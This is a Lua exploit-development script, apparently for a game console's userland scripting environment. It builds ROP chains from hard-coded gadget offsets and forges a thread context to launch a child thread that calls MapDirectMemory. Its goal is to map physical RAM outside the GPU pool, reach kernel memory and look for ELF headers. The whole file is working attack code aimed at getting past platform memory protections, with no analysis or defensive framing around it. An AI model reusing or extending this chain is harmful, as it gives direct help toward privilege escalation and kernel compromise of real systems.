-- CRASH_CLASS: MODERATE
-- PROBE 546a: MapDirectMemory from thr_create(430) child thread
--
-- Context: All main-thread MapDM calls succeed (rv=0) but crash Lua's
-- memory subsystem (0x1337 signal) on any subsequent memory.read/write.
-- Child thread uses pure ROP — no Lua memory ops — so the crash is avoided.
--
-- Plan:
--   Phase A: main thread AllocateDirectMemory → phys_addr (GPU pool)
--   Phase B: thr_create child calls MapDM(virt_out, 0x4000, 3, 0, phys, 0x4000)
--            as a C function call (not syscall). r8=phys, r9=align from ucontext.
--   Phase C: child stores rv + virt_out to shared page, parks.
--   Phase D: main thread reads shared page, tries R/W on mapped address.
--   Phase E: second child with phys=0x1000000 (system RAM, 16MB mark)
--            to test if MapDM allows mapping OUTSIDE the GPU pool.
--
-- MapDM is a C function (libkernel+0x15020), SysV ABI:
--   rdi=&virt_out, rsi=len, rdx=prot, rcx=flags, r8=phys, r9=alignment
-- thr_create gives us r8/r9 via ucontext GP regs.

print("=== PROBE 546a: MapDM FROM CHILD THREAD ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_thr_kill = make_syscall(433)
local syscall_ret = syscall.pipe.fn_addr

-- ── Address discovery ──────────────────────────────────────────────
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print("EBOOT: " .. q(eboot))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print("LIBKERNEL: " .. q(lk))

print("FN_ADDR: " .. q(syscall_ret))

local pop_rax_ret     = eboot + uint64(0x992)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdx_ret     = eboot + uint64(0x3B02D7)
local pop_rcx_ret     = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self        = eboot + uint64(0x15481)
local bare_ret        = eboot + uint64(0x42)

local map_fn   = lk + uint64(0x15020)
local alloc_fn = lk + uint64(0x17EF0)
print("MapDM: " .. q(map_fn))
print("AllocDM: " .. q(alloc_fn))

-- ── Phase A: AllocateDirectMemory from main thread ─────────────────
print("")
print("[A] AllocateDirectMemory")
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
local ok_a, arv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local arv_n = ok_a and to_num(arv) or -1
local phys = rq(phys_out)
print("ALLOC-DM: rv=" .. arv_n .. " phys=" .. q(phys))
if not phys or to_num(phys) == 0 then
    print("FATAL: AllocateDirectMemory failed")
    return
end

-- ── Shared resources ───────────────────────────────────────────────
print("")
print("[B] Setup shared resources")

-- Shared results page: [0]=virt_out, [8]=rv, [16]=done_marker
local ok_sh, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, 0x100)
wq(shared + 0x00, uint64(0xAAAA0001))
wq(shared + 0x08, uint64(0xBBBB0001))
wq(shared + 0x10, uint64(0))
print("  shared=" .. q(shared))

-- Child stack: 2MB
local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print("  stack=" .. q(stack_base))

-- Fake TCB for child thread (self-referencing pointer page)
local ok_tc, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, tcb_page)
print("  tcb=" .. q(tcb_page))

-- virt_out buffer for MapDM (child writes here, main reads)
local virt_out_buf = memory.alloc(8)
wq(virt_out_buf, uint64(0))

-- ── Build child ROP chain ──────────────────────────────────────────
-- MapDM is a C FUNCTION call, not a raw syscall.
-- SysV ABI: rdi, rsi, rdx, rcx, r8, r9
-- r8=phys_addr, r9=alignment set via ucontext GP regs.
-- They survive sysarch (syscall only clobbers rcx/r11).

print("")
print("[C] Build ROP chain")
local chain = stack_base + 0x200000 - 0x800
local i = 0
local function emit(v) wq(chain + i, v); i = i + 8 end

-- Phase 0: sysarch(165) for fake TCB — required before any failing syscall
emit(uint64(165))            -- → rax
emit(pop_rdi_ret)
emit(uint64(129))            -- → rdi = AMD64_SET_FSBASE
emit(pop_rsi_ret)
emit(tcb_ptr)                -- → rsi = &tcb_ptr
emit(syscall_ret)            -- sysarch(129, &tcb_ptr)
                             -- r8/r9 survive (syscall clobbers rcx/r11 only)

-- Phase 1: MapDirectMemory(virt_out_buf, 0x4000, 3, 0, phys, 0x4000)
-- rdi=&virt_out_buf, rsi=0x4000, rdx=3(PROT_RW), rcx=0(flags)
-- r8=phys (from context +0x068), r9=0x4000 (from context +0x070)
emit(pop_rdi_ret)
emit(uint64(virt_out_buf))   -- → rdi = out addr pointer
emit(pop_rsi_ret)
emit(uint64(0x4000))         -- → rsi = length (16KB)
emit(pop_rdx_ret)
emit(uint64(3))              -- → rdx = prot (PROT_READ|PROT_WRITE)
emit(pop_rcx_ret)
emit(uint64(0))              -- → rcx = flags
emit(map_fn)                 -- ret → MapDM entry
                             -- RSP now at chain + 0x78 (after map_fn consumed)
                             -- MapDM returns: rax = rv

-- Phase 2: Store MapDM rv → shared[0x08]
emit(pop_rdi_ret)            -- chain+0x78
emit(shared + 0x08)          -- → rdi = &shared.rv
emit(mov_rdi_rax_ret)        -- *rdi = rax (MapDM rv)

-- Phase 3: Copy virt_out from virt_out_buf to shared[0x00]
-- We can't do a 64-bit load/store without a gadget pair.
-- Instead, have MapDM write directly to shared+0x00.
-- ACTUALLY: we already told MapDM rdi=virt_out_buf. Let's change rdi
-- to shared+0x00 so MapDM writes the virtual address there directly.
-- Then we don't need the copy.
-- → Go back and fix: virt_out_buf = shared+0x00
-- (We can just pass shared as the out pointer to MapDM.)

-- Phase 4: Done marker → shared[0x10]
emit(pop_rdi_ret)
emit(shared + 0x10)
emit(pop_rax_ret)
emit(uint64(0x444F4E45))     -- "DONE"
emit(mov_rdi_rax_ret)

-- Phase 5: Park thread (spin forever)
emit(jmp_self)

print("  chain_bytes=" .. i .. " entries=" .. (i/8))

-- FIX: Rewrite with virt_out_buf = shared (MapDM writes VA to shared+0x00 directly)
-- This avoids needing a 64-bit copy gadget chain.
i = 0

emit(uint64(165))            -- → rax (sysarch)
emit(pop_rdi_ret)
emit(uint64(129))            -- AMD64_SET_FSBASE
emit(pop_rsi_ret)
emit(tcb_ptr)
emit(syscall_ret)

-- MapDM: out_ptr=shared (writes VA to shared+0x00)
emit(pop_rdi_ret)
emit(shared)                 -- → rdi = &shared[0] (MapDM writes virt addr here)
emit(pop_rsi_ret)
emit(uint64(0x4000))         -- len
emit(pop_rdx_ret)
emit(uint64(3))              -- prot = PROT_RW
emit(pop_rcx_ret)
emit(uint64(0))              -- flags
emit(map_fn)                 -- call MapDM; rax = rv

-- Store rv → shared[0x08]
emit(pop_rdi_ret)
emit(shared + 0x08)
emit(mov_rdi_rax_ret)

-- Done marker → shared[0x10]
emit(pop_rdi_ret)
emit(shared + 0x10)
emit(pop_rax_ret)
emit(uint64(0x444F4E45))
emit(mov_rdi_rax_ret)

-- Park
emit(jmp_self)

print("  chain_bytes=" .. i .. " entries=" .. (i/8) .. " (final)")

-- ── Build ucontext ─────────────────────────────────────────────────
print("")
print("[D] Build ucontext")
local ctx = memory.alloc(0x500)
zero(ctx, 0x4C0)

-- Gates (required for thr_create validation)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))

-- Segment registers
wq(ctx + 0x0C0, uint64(0x43))    -- CS
wq(ctx + 0x100, uint64(0x3B))    -- SS
wq(ctx + 0x0F0, uint64(0x202))   -- RFLAGS

-- Entry point and stack
wq(ctx + 0x0E0, pop_rax_ret)     -- RIP = chain entry (first emit is rax val)
wq(ctx + 0x0F8, chain)           -- RSP = chain base

-- GP regs carrying MapDM args 5-6
wq(ctx + 0x068, phys)            -- R8 = phys_addr (MapDM arg5)
wq(ctx + 0x070, uint64(0x4000))  -- R9 = alignment (MapDM arg6)

print("  RIP=" .. q(pop_rax_ret))
print("  RSP=" .. q(chain))
print("  R8(phys)=" .. q(phys))
print("  R9(align)=0x4000")

-- ── Phase D: Launch child ──────────────────────────────────────────
print("")
print("[E] thr_create — launch child")
local tid_buf = memory.alloc(8); wq(tid_buf, uint64(0))
local ok_tc2, rv_tc = pcall(function()
    return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
end)
local rv_tc_n = ok_tc2 and to_num(rv_tc) or -999
local tid = rq(tid_buf)
print("CHILD-LAUNCH: rv=" .. rv_tc_n .. " tid=" .. q(tid))

if rv_tc_n ~= 0 then
    print("CHILD-REJECTED — context invalid")
    print("=== 546a DONE ===")
    return
end

-- ── Wait for child ─────────────────────────────────────────────────
print("")
print("[F] Waiting for child...")
local ts = memory.alloc(16)
wq(ts, uint64(0))
wq(ts + 8, uint64(100000000))  -- 100ms

local done = false
for attempt = 1, 50 do
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
    local marker = rq(shared + 0x10)
    if marker then
        local mn = to_num(marker)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn ~= 0 then
            done = true
            print("  child done at attempt " .. attempt)
            break
        end
    end
end

-- ── Read results ───────────────────────────────────────────────────
print("")
print("[G] Results")
local child_virt = rq(shared + 0x00)
local child_rv   = rq(shared + 0x08)
local child_done = rq(shared + 0x10)

print("CHILD-RESULT: virt=" .. q(child_virt) .. " rv=" .. q(child_rv) ..
    " done=" .. q(child_done))

if not done then
    print("  TIMEOUT — child may have crashed")
    local ok_k, rv_k = pcall(function()
        return sc_thr_kill(tid, uint64(0))
    end)
    print("  thr_kill(tid,0)=" .. (ok_k and to_num(rv_k) or "fail"))
    -- Still check shared in case child wrote partial results
end

local child_rv_n = 0
if child_rv then
    child_rv_n = to_num(child_rv)
    if child_rv_n < 0 then child_rv_n = child_rv_n + 0x100000000 end
end

if child_rv_n == 0 and child_virt and to_num(child_virt) ~= 0
    and to_num(child_virt) ~= 0xAAAA0001 then
    print("")
    print("*** MapDM SUCCEEDED from child thread! ***")
    print("  Mapped VA: " .. q(child_virt))

    -- Try R/W from main thread
    print("")
    print("[H] Main thread R/W test")
    local ok_wr = pcall(function()
        memory.write_dword(child_virt, 0xDEADBEEF)
    end)
    print("MAIN-WRITE: ok=" .. tostring(ok_wr))

    if ok_wr then
        local rb = rd(child_virt)
        if rb then
            if rb < 0 then rb = rb + 0x100000000 end
            print(string.format("MAIN-READ: [virt]=0x%08X", rb))
            if rb == 0xDEADBEEF then
                print("*** R/W CONFIRMED — physical memory mapped! ***")
            else
                print("  Write didn't stick or address different")
            end
        else
            print("MAIN-READ: fault")
        end
    else
        print("  Write faulted — VA may not be in main thread's map")
        -- Try reading without writing first
        local rb2 = rd(child_virt)
        if rb2 then
            if rb2 < 0 then rb2 = rb2 + 0x100000000 end
            print(string.format("  READ-ONLY: [virt]=0x%08X", rb2))
        else
            print("  READ-ONLY: also faults")
        end
    end
else
    print("")
    if child_rv_n ~= 0 then
        print(string.format("MapDM FAILED: rv=0x%X", child_rv_n))
    else
        print("MapDM: no result (child crashed before storing)")
    end
end

-- ══════════════════════════════════════════════════════════════════════
-- Phase E: Test with physical address OUTSIDE the GPU pool
-- GPU pool is 0x100000000–0x150000000.
-- Try 0x1000000 (16MB) — this is system RAM on x86 systems.
-- If MapDM allows it → we can scan for the kernel.
-- ══════════════════════════════════════════════════════════════════════
print("")
print("═══════════════════════════════════════")
print("[PHASE-E] MapDM with system RAM phys address")

local phys_sysram = uint64(0x1000000)  -- 16MB mark
print("PHASE-E: phys=" .. q(phys_sysram))

-- Fresh shared page for second child
local ok_sh2, shared2 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared2, 0x100)
wq(shared2 + 0x00, uint64(0xAAAA0002))
wq(shared2 + 0x08, uint64(0xBBBB0002))
wq(shared2 + 0x10, uint64(0))

-- Fresh stack
local ok_st2, stack2 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

-- Build chain for child 2 (same structure, different shared page)
local chain2 = stack2 + 0x200000 - 0x800
local j = 0
local function emit2(v) wq(chain2 + j, v); j = j + 8 end

-- sysarch for TCB
emit2(uint64(165))
emit2(pop_rdi_ret); emit2(uint64(129))
emit2(pop_rsi_ret); emit2(tcb_ptr)
emit2(syscall_ret)

-- MapDM with system RAM phys
emit2(pop_rdi_ret); emit2(shared2)          -- out ptr
emit2(pop_rsi_ret); emit2(uint64(0x4000))   -- len
emit2(pop_rdx_ret); emit2(uint64(3))        -- prot
emit2(pop_rcx_ret); emit2(uint64(0))        -- flags
emit2(map_fn)                               -- call MapDM

-- Store rv
emit2(pop_rdi_ret); emit2(shared2 + 0x08)
emit2(mov_rdi_rax_ret)

-- Done marker
emit2(pop_rdi_ret); emit2(shared2 + 0x10)
emit2(pop_rax_ret); emit2(uint64(0x444F4E45))
emit2(mov_rdi_rax_ret)

-- Park
emit2(jmp_self)

-- Build ucontext for child 2
local ctx2 = memory.alloc(0x500)
zero(ctx2, 0x4C0)
wq(ctx2 + 0x108, uint64(0x480))
wd(ctx2 + 0x0D0, 0)
wq(ctx2 + 0x110, uint64(0x10000))
wq(ctx2 + 0x0C0, uint64(0x43))
wq(ctx2 + 0x100, uint64(0x3B))
wq(ctx2 + 0x0F0, uint64(0x202))
wq(ctx2 + 0x0E0, pop_rax_ret)
wq(ctx2 + 0x0F8, chain2)
wq(ctx2 + 0x068, phys_sysram)        -- R8 = system RAM address
wq(ctx2 + 0x070, uint64(0x4000))     -- R9 = alignment

-- Launch child 2
local tid2_buf = memory.alloc(8); wq(tid2_buf, uint64(0))
local ok_tc3, rv_tc2 = pcall(function()
    return sc_430(uint64(ctx2), uint64(tid2_buf), uint64(0))
end)
local rv_tc2_n = ok_tc3 and to_num(rv_tc2) or -999
print("PHASE-E-LAUNCH: rv=" .. rv_tc2_n)

if rv_tc2_n ~= 0 then
    print("PHASE-E: child 2 rejected")
else
    -- Wait
    local done2 = false
    for attempt = 1, 50 do
        pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
        local m2 = rq(shared2 + 0x10)
        if m2 then
            local mn2 = to_num(m2)
            if mn2 < 0 then mn2 = mn2 + 0x100000000 end
            if mn2 ~= 0 then done2 = true; break end
        end
    end

    local e_virt = rq(shared2 + 0x00)
    local e_rv   = rq(shared2 + 0x08)
    local e_done = rq(shared2 + 0x10)
    print("PHASE-E-RESULT: virt=" .. q(e_virt) .. " rv=" .. q(e_rv) ..
        " done=" .. q(e_done))

    local e_rv_n = 0
    if e_rv then
        e_rv_n = to_num(e_rv)
        if e_rv_n < 0 then e_rv_n = e_rv_n + 0x100000000 end
    end

    if e_rv_n == 0 and e_virt and to_num(e_virt) ~= 0
        and to_num(e_virt) ~= 0xAAAA0002 then
        print("*** SYSTEM RAM MAPPED! ***")
        print("  VA=" .. q(e_virt))

        -- Read first 64 bytes
        print("  First 64 bytes:")
        local words = {}
        for off = 0, 60, 4 do
            local v = rd(e_virt + off)
            if v then
                if v < 0 then v = v + 0x100000000 end
                table.insert(words, string.format("+%02X=%08X", off, v))
            else
                table.insert(words, string.format("+%02X=FAULT", off))
                break
            end
        end
        print("  " .. table.concat(words, " "))

        -- Check for ELF header
        local magic = rd(e_virt)
        if magic then
            if magic < 0 then magic = magic + 0x100000000 end
            if magic == 0x464C457F then
                print("*** ELF HEADER FOUND AT PHYS 0x1000000! ***")
            end
        end
    else
        if e_rv_n ~= 0 then
            print(string.format("PHASE-E: MapDM rejected phys 0x1000000 — rv=0x%X", e_rv_n))
        elseif not done2 then
            print("PHASE-E: child 2 timed out (crashed)")
        else
            print("PHASE-E: no result")
        end
    end
end

print("")
print("=== 546a DONE ===")
